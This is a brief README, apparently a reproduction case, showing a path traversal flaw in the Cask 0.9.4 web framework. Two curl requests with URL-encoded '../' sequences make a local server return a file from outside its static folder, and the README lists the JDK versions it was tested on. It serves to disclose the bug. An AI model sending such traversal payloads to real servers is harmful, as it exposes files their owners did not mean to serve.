# Showcasing simple path traversal issue on Cask 0.9.4

- `sbt run`
- `curl http://localhost:8080/static/%2E%2E%2Fhi.txt`
  - Outputs `Got me…` from [`hi.txt`](hi.txt) instead of `Hi!` from [`static/hi.txt`](static/hi.txt)
  - `curl http://localhost:8080/static/..%2F/hi.txt` works as well
- Tested on: HotSpot 17+35-LTS-2724, OpenJDK 11.0.25, OpenJDK 21.0.5
